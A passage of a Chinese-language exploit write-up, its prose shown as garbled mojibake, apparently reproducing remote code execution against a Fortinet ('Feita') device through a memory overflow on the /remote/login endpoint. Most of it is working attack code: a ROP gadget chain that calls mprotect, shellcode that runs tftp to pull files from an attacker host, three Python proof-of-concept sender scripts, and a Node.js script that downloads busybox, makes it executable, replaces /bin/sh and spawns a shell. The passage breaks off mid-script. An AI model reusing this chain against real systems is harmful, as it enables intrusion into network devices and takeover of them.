é‚£ä»¥ä¸Šä¸¤ä¸ªæ€è·¯åŸºæœ¬éƒ½èµ°æ­»èµ°ä¸é€šçš„è¯ï¼Œæˆ‘ä»¬å°±ä¸è€ƒè™‘èµ°ropäº†ï¼Œç”¨ctfçš„æ€è·¯æŠŠropä¼ åŒ–ä¸ºshellcodeå°±å¯ä»¥å®ç°ä»»æ„gadgetäº†ï¼Œä½†æ˜¯æ²¡æœ‰  
  
  
å¯æ‰§è¡Œæƒé™ å¼€äº†nxä¿æŠ¤ è¿™é‡Œå°±æƒ³åˆ°ç”¨mprotect å¼€ä¸€æ®µå¯æ‰§è¡Œæƒé™çš„æ®µï¼Œç„¶åå‰é¢æ‰“systemçš„æ—¶å€™ å¯ä»¥çœ‹åˆ° å¯„å­˜å™¨ä¸Šæ˜¯æœ‰æ®‹ä½™æ®µçš„åœ°å€çš„ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡ropå»æ‰§è¡Œmprotect ç„¶åå°±å¯ä»¥å¿«ä¹çš„å†™shellcodeå»å‘½ä»¤æ‰§è¡Œäº†  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfIwuzYHRAI7zbaXyUIclOOK3Nz6hVGozCziaSL5Yx39zjIo6QaaJjhPg/640?wx_fmt=png&from=appmsg "")  
  
  
æ”»å‡»æ„é€ è¿‡ç¨‹  
  
  
mprotectæ‰€éœ€è¦çš„å‚æ•°(addr,len,prot) ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦åŠ«æŒrdi rsi rdxè¿™ä¸‰ä¸ªå‚æ•° å¹¶ä¸”è°ƒç”¨call mprotect  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfp9wiavQQ4PySeKUroanmbRGk6KjxsFfcqBcQV3xjkZ2cU732ACzLGAA/640?wx_fmt=png&from=appmsg "")  
  
  
gdb-peda$ 0x7ff1e109cd78 Â  Â  Â 0x7ff1e0f42000 Â  Â  0x7ff1e11c2000 Â  0x280000 Â  Â  Â  Â 0x0 Â rw-p Â Â   
  
  
æˆ‘ä»¬å†™çš„ä½ç½®å±äºè¿™ä¸ªæ®µ  
  
  
0x7ff1e0f42000- 0x7ff1e109cd78 =FFFF FFFF FFEA 5288  
  
  
è¿™é‡Œæ˜¯æ®‹å­˜çš„å‚æ•°rdxÂ   
  
  
åˆ©ç”¨gadgetå¦‚ä¸‹  
  
```
#0x000000000257008a push rdx,pop rdi.ret
#0x0000000000530c8e : pop rsi ; ret
#0x000000000046bb27 : pop rax ; ret
#0x000000000060e7e9 : pop rax ; pop rsi ; ret ç»•è¿‡æœ€å¼€å§‹é‚£ä¸ª1æ— æ³•å†™å…¥çš„é™åˆ¶
#0x000000000043F3D0 call mprotectÂ 
#0x0000000000509372 : pop rdx ; ret
#0x0000000002a0e0e0 : add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
#0x00000000005dc96d jmp rsp
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfOMrqYVFpDJzYDyqfOOASuSRDB5vDUdIDw4ibC3jraF2dV0FEffvxIzw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8df8Z3ceduSaHFcwEvncpy3tDtdDlKYHnGd1zUIwjRyIrs7wNDZJeZJJQ/640?wx_fmt=png&from=appmsg "")  
  
  
ç„¶åæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨jmp rspè·³è½¬å°±å¯ä»¥æ‰§è¡Œshellcodeäº† è¿™é‡Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬å¯ä»¥ç›´æ¥æ¥ç€jmp rspåé¢å†™shellcodeÂ   
  
### shellcodeæ€è·¯  
  
  
ç”±äºæˆ‘ä»¬è¿™é‡Œå†™å…¥çš„å­—èŠ‚æœ‰é™å¤§æ¦‚0xc0é•¿åº¦çš„æ ·å­ï¼Œå¦‚æœè¦å†™æ¯”è¾ƒéº»çƒ¦çš„å‘½ä»¤æ‰§è¡Œ å¯èƒ½ä¸å¤Ÿï¼Œè¿™é‡Œæˆ‘çš„æ€è·¯æ˜¯å»è¿ç§»ripåˆ°0x620+8çš„è¿™ä¸ªä½ç½® ä¹Ÿå°±æ˜¯lea rax, [rip + 0x69] Â ç„¶åå°±æœ‰äº†åŸºæœ¬æ²¡æœ‰é•¿åº¦é™åˆ¶çš„shellcodeçš„æœºä¼šï¼Œè¿˜æœ‰ç§æ€è·¯å°±æ˜¯æ„é€ ä¸€ä¸ªread ä½†æ˜¯æˆ‘è¿™é‡Œsyscallä¸‹å» gdbå¹¶æ²¡æœ‰å¡ä½ç­‰å¾…è¯»å–ï¼Œç›®å‰ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œæ‰€ä»¥å°±èµ°æ€è·¯ä¸€äº†  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfJcicw8oWW2fDYzibLra6ty81FCkUibM7YrjVeuSBLBRB78lM0FoYJ4CKQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfJNC994ZoFPo2aMVxJ2mg5jJlG1ibrichMo8UK3LBkQRH7icOB2u7tZhgw/640?wx_fmt=png&from=appmsg "")  
  
  
æ¥ä¸‹æ¥å°±å¯ä»¥å¿«ä¹çš„å†™shellcodeäº† æˆ‘ä»¬éœ€è¦å¹²çš„å°±æ˜¯ï¼š  
  
  
execlæ‰§è¡Œï¼š/bin/tftp 192.168.111.160 1.js get octet ./1.js  
  
  
å®é™…  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8df6yy2CNsibpITMZuZoFAoIHmibz8aAwNEYrlzl3U0czV3tpxNQr5lPMNQ/640?wx_fmt=png&from=appmsg "")  
  
  
execl("/bin/tftp", "/bin/tftp", "192.168.111.148", "1.js", "get", "octet", NULL);  
  
  
execl("/bin/tftp","/bin/tftp","192.168.111.148","1.js","get",octet","NULL")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfceIZq4yBZd8deAYGx7Cdg2uicatLQZ2UIXkZ1OqpxoAQTU332Wx934Q/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™é‡Œä¹Ÿå°±æ˜¯ä¸€ä¸ªä¸ªä¼ å‚ï¼Œå”¯ä¸€æ³¨æ„çš„å°±æ˜¯ è¶…è¿‡å…«å­—èŠ‚çš„è¦åˆ†ä¸¤æ¬¡åˆ‡å‰²ä¼   
  
  
æœ€åå‚æ•°æƒ…å†µ  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfTKibM1aJS7icwpUicqJWNloR0QcslJ2tVIxRKtMYzyjOEnpsRjBm0zeibA/640?wx_fmt=png&from=appmsg "")  
  
  
æ£€éªŒï¼š  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfh8u6Wq7f6H9icOLR3Egaqp7EgTZp4ZQ8feKItuxsmqsxrZiawQbHzvjw/640?wx_fmt=png&from=appmsg "")  
  
  
æˆåŠŸå®ç°æ”»å‡» è¿™é‡Œç›‘æµ‹ä¸€ä¸‹busyboxèƒ½å¦ä¸Šä¼ å¹¶æ­£å¸¸ä½¿ç”¨  
  
  
ç›´æ¥get busyboxä¸æŒ‡å®šè·¯å¾„ æˆåŠŸ  
  
```
import socket
import ssl
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *
context.arch = 'amd64'


path = "/remote/login".encode()
content_length = ["115964116992"]
ip = "192.168.111.148"
#1376
#0x000000000257008a push rdx,pop rdi.ret
#0x0000000000530c8e : pop rsi ; ret
#0x000000000046bb27 : pop rax ; ret
#0x000000000060e7e9 : pop rax ; pop rsi ; ret ç»•è¿‡æœ€å¼€å§‹é‚£ä¸ª1æ— æ³•å†™å…¥çš„é™åˆ¶
#0x000000000043F3D0 call mprotectÂ 
#0x0000000000509372 : pop rdx ; ret
#0x0000000002a0e0e0 : add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
#0x00000000005dc96d jmp rsp
#0x43A160 execl
def bytes2stack_bytes(bytes):
Â  Â  stack_str = "0x"
Â  Â  swap_data = bytearray(bytes)
Â  Â  swap_data.reverse()
Â  Â  for i in swap_data:
Â  Â  Â  Â  t = hex(i)[2:]
Â  Â  Â  Â  stack_str+=t

Â  Â  return stack_str
shellcode1 = asm('''
Â  Â  lea rax, [rip + 0x69]
Â  Â  jmp rax
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop

''')
print(len(shellcode1))
def gen_shellcode_download_file():
Â  Â  save_path2 = bytes2stack_bytes(b"/cin/bus")
Â  Â  save_path1 = bytes2stack_bytes(b'ybox')
Â  Â  arg2 = bytes2stack_bytes(b"octet")
Â  Â  arg1 = bytes2stack_bytes(b"get")
Â  Â  filename = bytes2stack_bytes(b"busybox")

Â  Â  ip_addr2 = bytes2stack_bytes(b"111.160")
Â  Â  ip_addr1 = bytes2stack_bytes(b"192.168.")

Â  Â  cmd_path2 = bytes2stack_bytes(b"p")
Â  Â  cmd_path1 = bytes2stack_bytes(b"/bin/tft")
Â  Â  shellcode = asm('''
Â  Â  Â  sub rsp,0x1000
Â  Â  Â  push 0
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov r9, rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov r8, rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rcx,rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rdx,rsp
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rsi,rsp
Â  Â  Â  mov rdi,rsp
Â  Â  Â  add rax, 0x70
Â  Â  Â  mov rsp, rax
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop

Â  Â  Â  ret
'''.format(arg2,arg1,filename,ip_addr2,ip_addr1,cmd_path2,cmd_path1,save_path1,save_path2))
Â  Â  print(shellcode)
Â  Â  print(hex(len(shellcode)))
Â  Â  return shellcode
ROP=struct.pack('q',0x000000000060e7e9)
ROP+=struct.pack('Q',0xffffffffffeA5288)
ROP+=struct.pack('q',0)
ROP+=struct.pack('q',0x0000000002a0e0e0)
ROP+=struct.pack('q',0x000000000257008a)
ROP+=struct.pack('q',0x0000000000530c8e)
ROP+=struct.pack('q',0x200000)
ROP+=struct.pack('q',0x0000000000509372)
ROP+=struct.pack('q',0x7)
ROP+=struct.pack('q',0x000000000043F3D0)
ROP+=struct.pack('q',0x00000000005dc96d)
ROP+=shellcode1
#441A50

print(hex(len(ROP)))

payload=b'a'*0x560+ROP
payload=payload.ljust(0x620,b'a')+struct.pack('q', 0x0000000000febbaa)+gen_shellcode_download_file()+struct.pack('q',0x43A160)
for CL in content_length:
Â  Â  try:
Â  Â  Â  Â  data = b"POST " + path + b" HTTP/1.1\r\nHost: " + \
Â  Â  Â  Â  Â  Â  ip.encode() + b"\r\nContent-Length: " + CL.encode() + \
Â  Â  Â  Â  Â  Â  b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n"+payload

Â  Â  Â  Â  _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Â  Â  Â  Â  _socket.connect((ip, 4433))
Â  Â  Â  Â  _default_context = ssl._create_unverified_context()
Â  Â  Â  Â  _socket = _default_context.wrap_socket(_socket)
Â  Â  Â  Â  _socket.sendall(data)
Â  Â  Â  Â  res = _socket.recv(1024)
Â  Â  Â  Â  print(res)
Â  Â  Â  Â  if b"HTTP/1.1" not in res:
Â  Â  Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  Â  Â  break
Â  Â  except Exception as e:
Â  Â  Â  Â  print(e)
Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  break

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8df3jpj8rhVwgzf23ZeWY0bY7YOox3uQMCaNQZydjHHfTicSjHgsCNiauOg/640?wx_fmt=png&from=appmsg "")  
  
  
ä¼å›¾ç›´æ¥æŠŠbusyboxæ”¾åˆ°/cin/busyboxä¸­ ç»“æœæµ‹è¯•å¤±è´¥  
  
```
import socket
import ssl
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *
context.arch = 'amd64'


path = "/remote/login".encode()
content_length = ["115964116992"]
ip = "192.168.111.148"
#1376
#0x000000000257008a push rdx,pop rdi.ret
#0x0000000000530c8e : pop rsi ; ret
#0x000000000046bb27 : pop rax ; ret
#0x000000000060e7e9 : pop rax ; pop rsi ; ret ç»•è¿‡æœ€å¼€å§‹é‚£ä¸ª1æ— æ³•å†™å…¥çš„é™åˆ¶
#0x000000000043F3D0 call mprotectÂ 
#0x0000000000509372 : pop rdx ; ret
#0x0000000002a0e0e0 : add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
#0x00000000005dc96d jmp rsp
#0x43A160 execl
def bytes2stack_bytes(bytes):
Â  Â  stack_str = "0x"
Â  Â  swap_data = bytearray(bytes)
Â  Â  swap_data.reverse()
Â  Â  for i in swap_data:
Â  Â  Â  Â  t = hex(i)[2:]
Â  Â  Â  Â  stack_str+=t

Â  Â  return stack_str
shellcode1 = asm('''
Â  Â  lea rax, [rip + 0x69]
Â  Â  jmp rax
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop

''')
print(len(shellcode1))
def gen_shellcode_download_file():
Â  Â  save_path2 = bytes2stack_bytes(b"/cin/bus")
Â  Â  save_path1 = bytes2stack_bytes(b'ybox')
Â  Â  arg2 = bytes2stack_bytes(b"octet")
Â  Â  arg1 = bytes2stack_bytes(b"get")
Â  Â  filename = bytes2stack_bytes(b"busybox")

Â  Â  ip_addr2 = bytes2stack_bytes(b"111.160")
Â  Â  ip_addr1 = bytes2stack_bytes(b"192.168.")

Â  Â  cmd_path2 = bytes2stack_bytes(b"p")
Â  Â  cmd_path1 = bytes2stack_bytes(b"/bin/tft")
Â  Â  shellcode = asm('''
Â  Â  Â  sub rsp,0x1000
Â  Â  Â  push 0
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov r9, rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov r8, rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rcx,rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rdx,rsp
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rsi,rsp
Â  Â  Â  mov rdi,rsp
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov r10,rsp
Â  Â  Â  add rax, 0x90
Â  Â  Â  mov rsp, rax
Â  Â  Â  push r10
Â  Â  Â  sub rsp,8

Â  Â  Â  ret
'''.format(arg2,arg1,filename,ip_addr2,ip_addr1,cmd_path2,cmd_path1,save_path1,save_path2))
Â  Â  print(shellcode)
Â  Â  print(hex(len(shellcode)))
Â  Â  return shellcode
ROP=struct.pack('q',0x000000000060e7e9)
ROP+=struct.pack('Q',0xffffffffffeA5288)
ROP+=struct.pack('q',0)
ROP+=struct.pack('q',0x0000000002a0e0e0)
ROP+=struct.pack('q',0x000000000257008a)
ROP+=struct.pack('q',0x0000000000530c8e)
ROP+=struct.pack('q',0x200000)
ROP+=struct.pack('q',0x0000000000509372)
ROP+=struct.pack('q',0x7)
ROP+=struct.pack('q',0x000000000043F3D0)
ROP+=struct.pack('q',0x00000000005dc96d)
ROP+=shellcode1
#441A50

print(hex(len(ROP)))

payload=b'a'*0x560+ROP
payload=payload.ljust(0x620,b'a')+struct.pack('q', 0x0000000000febbaa)+gen_shellcode_download_file()+struct.pack('q',0x43A160)
for CL in content_length:
Â  Â  try:
Â  Â  Â  Â  data = b"POST " + path + b" HTTP/1.1\r\nHost: " + \
Â  Â  Â  Â  Â  Â  ip.encode() + b"\r\nContent-Length: " + CL.encode() + \
Â  Â  Â  Â  Â  Â  b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n"+payload

Â  Â  Â  Â  _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Â  Â  Â  Â  _socket.connect((ip, 4433))
Â  Â  Â  Â  _default_context = ssl._create_unverified_context()
Â  Â  Â  Â  _socket = _default_context.wrap_socket(_socket)
Â  Â  Â  Â  _socket.sendall(data)
Â  Â  Â  Â  res = _socket.recv(1024)
Â  Â  Â  Â  print(res)
Â  Â  Â  Â  if b"HTTP/1.1" not in res:
Â  Â  Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  Â  Â  break
Â  Â  except Exception as e:
Â  Â  Â  Â  print(e)
Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  break

```  
  
è¿™ä¸Šé¢ç›´æ¥ä¼ åˆ°æŒ‡å®šè·¯å¾„çš„é—®é¢˜æ˜¯ç¬¬ä¸ƒä¸ªå‚æ•°çš„ä¼ é€’ å¦‚æœç›´æ¥push ä¼šè¦†ç›–æˆ‘ä»¬å†™çš„shellcodeå¯¼è‡´ç¨‹åºå´©æºƒ æš‚æ—¶æœªæƒ³åˆ°å¥½çš„è§£å†³åŠæ³•  
  
  
è¿™é‡Œæ‰§è¡Œæœ‰ä¸¤ä¸ªé—®é¢˜ ä¸€æ²¡æƒé™ äºŒæ²¡æŒ‡å®šlibåº“  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfXaiaicwiapkGJMCbTnBiaPibyMDKFeyV7fn7FxawfKx8CbXYQ5CnbPia5HnA/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™ä¸ªé—®é¢˜å¾—æ€è€ƒä¸€ä¸‹æ€ä¹ˆè§£å†³ åœ¨çœŸå®ç¯å¢ƒä¸­ç›´æ¥getä¸€ä¸ªbusybox å¥½åƒä¸å¤Ÿç”¨ Â å› ä¸ºæ²¡æœ‰å¯æ‰§è¡Œçš„æƒé™åªæœ‰è¯»å†™æƒé™ è¿™é‡Œæƒ³äº†å¾ˆä¹…æ²¡æƒ³åˆ°æœ‰ä»€ä¹ˆåŠæ³•ï¼Œä¹Ÿç”¨äº†å‡ ä¸ªexpå°è¯•èµ‹æƒ å‘ç°è¦ä¹ˆå¤ªéº»çƒ¦ è¦ä¹ˆéƒ½å¤±è´¥äº†ï¼Œæœ€ååœ¨ioo0så¸ˆå‚…æ–‡ç« ä¸­ï¼Œå­¦åˆ°äº†æ€è·¯  
  
### Nodejs shellcode  
  
  
è¿™ä½å¸ˆå‚…ç”¨çš„æ˜¯Nodejs shellcodeï¼Œåˆ©ç”¨é£å¡”å±…ç„¶å†…ç½®çš„nodejsé€šè¿‡æµ‹è¯•å‘ç° nodejs xx.js æ˜¯å¯æ‰§è¡Œçš„ï¼Œå¹¶ä¸” nodejs ä¹Ÿå­˜åœ¨ä¿®æ”¹æ–‡ä»¶æƒé™çš„å‡½æ•° è¿™é‡Œæˆ‘ä»¬å…ˆç¡®å®šä¸€ä¸‹nodejsç¡®å®å­˜åœ¨  
  
  
é€šè¿‡æ‰§è¡Œå‘½ä»¤æˆ–è€…ç›´æ¥æŸ¥æ‰¾å‘ç°æ˜¯æ²¡æœ‰çš„ ä½†æ˜¯é€šè¿‡node*æŸ¥æ‰¾  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8df8Q4upr29RrXK2RTXQGhvvuD13xTZx8VuXsBuibPMxsJOiaGD5YovwAUA/640?wx_fmt=png&from=appmsg "")  
  
  
ä¼ ä¸€ä¸ªjsæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8df7u1FbegYdiagEwXadpQPBs6iaicPr9RgCWxJhaM1BibKTF6y2Y15OCsaDQ/640?wx_fmt=png&from=appmsg "")  
  
  
æ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œå› æ­¤æˆ‘ä»¬æ€è·¯å°±ååˆ†æ¸…æ™°äº†  
  
  
è¿™é‡Œæ¬è¿ä¸€ä¸‹è¿™ä½ioo0så¸ˆå‚…çš„æ€è·¯  
  
  
1. é€šè¿‡ä¹‹å‰çš„å‘½ä»¤æ‰§è¡Œä¸‹è½½ shell.js  
1. shell.js ä¸­è‡³å°‘è¦åŒ…å«ä»¥ä¸‹åŠŸèƒ½  
1. ä¸€ï¼šä¸‹è½½ busybox ï¼ˆæ¯”ä¹‹å‰çš„æ“ä½œç®€å•å¤šäº†ï¼ï¼‰  
1. äºŒï¼šç»™ busybox æ‰§è¡Œæƒé™  
1. ä¸‰ï¼šå¼„ä¸€ä¸ª busybox çš„ shell è½¯é“¾  
1. å››ï¼šè°ƒç”¨ busybox ä¸­å†…ç½®çš„å‘½ä»¤ èµ· shell  
è¿˜æœ‰ä¸€ç§æ€è·¯å°±æ˜¯é€šè¿‡nodejs å»æ¸²æŸ“åå¼¹shellçš„æŒ‡ä»¤ è™½ç„¶é£å¡”çš„shellè¢«é˜‰å‰²çš„å¾ˆä¸¥é‡ ä½†æ˜¯å¯ä»¥ç”¨wget ç„¶å å»wget æœåŠ¡å™¨ä¸Šçš„busybox  
  
  
è¿™é‡Œä¸€ä¸ªä¸€ä¸ªæ€è·¯è®²å§å…ˆå¤ç°ä¸€ä¸‹ioo0så¸ˆå‚…çš„æ€è·¯  
  
#### æ”¾å…¥jsæ–‡ä»¶ç”¨nodejsæ¸²æŸ“æ‹‰å»busyboxå¹¶ä¸”èµ‹æƒ å¼€sshç¯å¢ƒ  
  
  
jsçš„æ–‡ä»¶å†…å®¹  
  
```
const fs = require('fs');
const { execSync } = require('child_process');

const tftpServer = '192.168.111.160'; Â  Â // âš ï¸ æ›¿æ¢ä¸ºä½ çš„ TFTP æœåŠ¡å™¨ IP
const remoteFile = 'busybox'; Â  Â  Â  Â  Â  Â // âš ï¸ æ›¿æ¢ä¸ºä½ çš„ busybox æ–‡ä»¶å
const localPath = '/bin/busybox';
const shellLink = '/bin/sh';

try {
Â  // 1. ä½¿ç”¨æ­£ç¡®æ ¼å¼çš„ tftp å‘½ä»¤
Â  console.log('[*] æ­£åœ¨é€šè¿‡ TFTP ä¸‹è½½ busybox...');
Â  execSync(`tftp ${tftpServer} ${remoteFile} get octet ${localPath}`, { stdio: 'inherit' });

Â  // 2. èµ‹äºˆæ‰§è¡Œæƒé™
Â  console.log('[*] è®¾ç½®æ‰§è¡Œæƒé™...');
Â  fs.chmodSync(localPath, 0o755);

Â  // 3. åˆ›å»ºè½¯é“¾æ¥
Â  console.log('[*] åˆ›å»º shell è½¯é“¾...');
Â  if (fs.existsSync(shellLink)) fs.unlinkSync(shellLink);
Â  fs.symlinkSync(localPath, shellLink);

Â  // 4. å¯åŠ¨ busybox çš„ shell
Â  console.log('[*] å¯åŠ¨ busybox shell...');
Â  execSync(`${shellLink} sh`, { stdio: 'inherit' });

} catch (err) {
Â  console.error('[!] æ‰§è¡Œå¤±è´¥:', err.message);
}
```  
  
Â busyboxå¯ä»¥ç”¨è‡ªå·±ç¼–è¯‘çš„ä¹Ÿå¯ä»¥å»wgetä¸€ä¸ª  
  
  
ç¼–è¯‘å¥½çš„busyboxåœ°å€å„ä¸ªæ¶æ„éƒ½æœ‰  
  
  
Index of /downloads/binaries/1.21.1  
  
  
ä¸Šä¼ busy.jsæ–‡ä»¶ POC  
  
```
import socket
import ssl
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *
context.arch = 'amd64'


path = "/remote/login".encode()
content_length = ["115964116992"]
ip = "192.168.111.148"
#1376
#0x000000000257008a push rdx,pop rdi.ret
#0x0000000000530c8e : pop rsi ; ret
#0x000000000046bb27 : pop rax ; ret
#0x000000000060e7e9 : pop rax ; pop rsi ; ret ç»•è¿‡æœ€å¼€å§‹é‚£ä¸ª1æ— æ³•å†™å…¥çš„é™åˆ¶
#0x000000000043F3D0 call mprotectÂ 
#0x0000000000509372 : pop rdx ; ret
#0x0000000002a0e0e0 : add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
#0x00000000005dc96d jmp rsp
#0x43A160 execl
def bytes2stack_bytes(bytes):
Â  Â  stack_str = "0x"
Â  Â  swap_data = bytearray(bytes)
Â  Â  swap_data.reverse()
Â  Â  for i in swap_data:
Â  Â  Â  Â  t = hex(i)[2:]
Â  Â  Â  Â  stack_str+=t

Â  Â  return stack_str
shellcode1 = asm('''
Â  Â  lea rax, [rip + 0x69]
Â  Â  jmp rax
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop

''')
print(len(shellcode1))
def gen_shellcode_download_file():
Â  Â  save_path2 = bytes2stack_bytes(b"/cin/bus")
Â  Â  save_path1 = bytes2stack_bytes(b'ybox')
Â  Â  arg2 = bytes2stack_bytes(b"octet")
Â  Â  arg1 = bytes2stack_bytes(b"get")
Â  Â  filename = bytes2stack_bytes(b"busy.js")

Â  Â  ip_addr2 = bytes2stack_bytes(b"111.160")
Â  Â  ip_addr1 = bytes2stack_bytes(b"192.168.")

Â  Â  cmd_path2 = bytes2stack_bytes(b"p")
Â  Â  cmd_path1 = bytes2stack_bytes(b"/bin/tft")
Â  Â  shellcode = asm('''
Â  Â  Â  sub rsp,0x1000
Â  Â  Â  push 0
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov r9, rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov r8, rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rcx,rsp
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rdx,rsp
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rsi,rsp
Â  Â  Â  mov rdi,rsp
Â  Â  Â  add rax, 0x70
Â  Â  Â  mov rsp, rax
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop

Â  Â  Â  ret
'''.format(arg2,arg1,filename,ip_addr2,ip_addr1,cmd_path2,cmd_path1,save_path1,save_path2))
Â  Â  print(shellcode)
Â  Â  print(hex(len(shellcode)))
Â  Â  return shellcode
ROP=struct.pack('q',0x000000000060e7e9)
ROP+=struct.pack('Q',0xffffffffffeA5288)
ROP+=struct.pack('q',0)
ROP+=struct.pack('q',0x0000000002a0e0e0)
ROP+=struct.pack('q',0x000000000257008a)
ROP+=struct.pack('q',0x0000000000530c8e)
ROP+=struct.pack('q',0x200000)
ROP+=struct.pack('q',0x0000000000509372)
ROP+=struct.pack('q',0x7)
ROP+=struct.pack('q',0x000000000043F3D0)
ROP+=struct.pack('q',0x00000000005dc96d)
ROP+=shellcode1
#441A50

print(hex(len(ROP)))

payload=b'a'*0x560+ROP
payload=payload.ljust(0x620,b'a')+struct.pack('q', 0x0000000000febbaa)+gen_shellcode_download_file()+struct.pack('q',0x43A160)
for CL in content_length:
Â  Â  try:
Â  Â  Â  Â  data = b"POST " + path + b" HTTP/1.1\r\nHost: " + \
Â  Â  Â  Â  Â  Â  ip.encode() + b"\r\nContent-Length: " + CL.encode() + \
Â  Â  Â  Â  Â  Â  b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n"+payload

Â  Â  Â  Â  _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Â  Â  Â  Â  _socket.connect((ip, 4433))
Â  Â  Â  Â  _default_context = ssl._create_unverified_context()
Â  Â  Â  Â  _socket = _default_context.wrap_socket(_socket)
Â  Â  Â  Â  _socket.sendall(data)
Â  Â  Â  Â  res = _socket.recv(1024)
Â  Â  Â  Â  print(res)
Â  Â  Â  Â  if b"HTTP/1.1" not in res:
Â  Â  Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  Â  Â  break
Â  Â  except Exception as e:
Â  Â  Â  Â  print(e)
Â  Â  Â  Â  print("Error detected")
